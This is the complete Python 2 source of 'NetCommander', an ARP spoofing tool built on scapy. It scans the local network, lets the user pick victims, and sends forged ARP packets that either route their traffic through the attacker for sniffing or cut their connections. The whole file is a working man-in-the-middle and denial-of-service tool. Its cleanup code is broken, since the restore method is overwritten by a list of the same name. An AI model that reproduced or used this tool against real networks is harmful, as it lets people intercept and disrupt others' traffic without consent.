#!/usr/bin/python
# This file is part of NetCommander.
#
# Copyright(c) 2010-2011 Simone Margaritelli
# evilsocket@gmail.com
# http://www.evilsocket.net
# http://www.backbox.org
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
import logging
import time
import os
import sys
import atexit
from optparse import OptionParser

# disable scapy warnings about ipv6 and shit like that
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import srp,Ether,ARP,conf,sendp,ltoa

class NetCmd:

  def __bit_count( self, n ):
    bits = 0
    while n:
      bits += n & 1
      n   >>= 1
    return bits

  def __set_forwarding( self, status ):
    if not os.path.exists( '/proc/sys/net/ipv4/ip_forward' ):
      raise Exception( "'/proc/sys/net/ipv4/ip_forward' not found, this is not a compatible operating system." )
      
    fd = open( '/proc/sys/net/ipv4/ip_forward', 'w+' )
    fd.write( '1' if status == True else '0' )
    fd.close()

  def find_alive_hosts( self ):
    self.gateway_hw = None
    self.endpoints  = []
    
    print "@ Searching for alive network endpoints ..."

    # broadcast arping ftw
    ans,unans = srp( Ether( dst = "ff:ff:ff:ff:ff:ff" ) / ARP( pdst = self.network ), 
                     verbose = False, 
                     filter  = "arp and arp[7] = 2", 
                     timeout = 2, 
                     iface_hint = self.network )

    for snd,rcv in ans:
      if rcv.psrc == self.gateway:
        self.gateway_hw = rcv.hwsrc
      else:
        self.endpoints.append( ( rcv.hwsrc, rcv.psrc ) )
      
    if self.endpoints == []:
      raise Exception( "Could not find any network alive endpoint." )

  def __init__( self, interface, kill = False ):
    # scapy, you're pretty cool ... but shut the fuck up bitch!
    conf.verb = 0

    self.interface  = interface
    self.network    = None
    self.targets    = [] 
    self.gateway    = None
    self.gateway_hw = None
    self.packets    = []
    self.restore    = []
    self.endpoints  = []

    if not os.geteuid() == 0:
      raise Exception( "Only root can run this script." )
   
    print "@ Searching for the network gateway address ..."

    for route in conf.route.routes:
      # found a route for given interface
      if route[3] == self.interface:
        # compute network representation if not yet done
        if self.network is None:
          net  = ltoa( route[0] )
          msk  = route[1]
          bits = self.__bit_count( msk )
          self.network = "%s/%d" % ( net, bits )
        # search for a valid network gateway
        if route[2] != '0.0.0.0':
          self.gateway = route[2]
    
    if self.gateway is not None and self.network is not None:
      print "@ Gateway is %s on network %s ." % ( self.gateway, self.network )
    else:
      raise Exception( "Could not find any network gateway." )

    self.find_alive_hosts()

    print "@ Please choose your target :"
    choice = None
    
    while choice is None:
      for i, item in enumerate( self.endpoints ):
        print "  [%d] %s %s" % ( i, item[0], item[1] )
      choice = raw_input( "@ Choose [0-%d] (* to select all, r to refresh): " % (len(self.endpoints) - 1) )
      try:
        choice = choice.strip()
        if choice == '*':
          self.targets = self.endpoints
        elif choice.lower() == 'r':
          choice = None
          self.find_alive_hosts()
        else:
          self.targets.append( self.endpoints[ int(choice) ] )
      except Exception as e:
        print "@ Invalid choice!"
        choice = None
    
    # craft packets to accomplish a full forwarding:
    #   gateway -> us -> target
    #   target  -> us -> gateway
    for target in self.targets:
      self.packets.append( Ether( dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
      self.packets.append( Ether( dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )
      # and packets to restore the cache later
      self.restore.append( Ether( src = target[0],       dst = self.gateway_hw ) / ARP( op = "who-has", psrc = target[1],    pdst = self.gateway ) )
      self.restore.append( Ether( src = self.gateway_hw, dst = target[0] )       / ARP( op = "who-has", psrc = self.gateway, pdst = target[1] ) )

    if not kill:
      print "@ Enabling ipv4 forwarding system wide ..."
      self.__set_forwarding( True )
    else:
      print "@ Disabling ipv4 forwarding system wide to kill target connections ..."
      self.__set_forwarding( False )
    
    atexit.register( self.restore )
    
  def restore( self ):
    os.write( 1, "@ Restoring ARP cache " )
    for i in range(5):
      for packet in self.restore:
        sendp( packet, iface_hint = self.gateway )
      os.write( 1, '.' )
      time.sleep(1)
    os.write( 1, "\n" )

    self.__set_forwarding( False )
    
  def spoof( self ):
    for packet in self.packets:
      sendp( packet, iface_hint = self.gateway )

try:
  print "\n\tNetCommander 1.1 - An easy to use arp spoofing tool.\n \
\tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n \
\thttp://www.evilsocket.net\n\thttp://www.backbox.org\n";
         
  parser = OptionParser( usage = "usage: %prog [options]" )

  parser.add_option( "-I", "--iface", action="store",      dest="iface", default=conf.iface, help="Network interface to use if different from the default one." );
  parser.add_option( "-K", "--kill",  action="store_true", dest="kill",  default=False,      help="Kill targets connections instead of forwarding them." )
  parser.add_option( "-D", "--delay", action="store",      dest="delay", default=5,          help="Delay in seconds between one arp packet and another, default is 5." )
  
  (o,args) = parser.parse_args()

  ncmd = NetCmd( o.iface, o.kill )
  
  if not o.kill:
    os.write( 1, "@ Spoofing, launch your preferred network sniffer to see target traffic " )
  else:
    os.write( 1, "@ Killing target connections, wait a for a few packets to be sent and then quit with CTRL+C " )

  while 1:
    ncmd.spoof()
    os.write( 1, '.' )
    time.sleep( o.delay )

except KeyboardInterrupt:
  print "\n@ Bye ^^"

except Exception as e:
  print "@ ERROR : %s" % e 
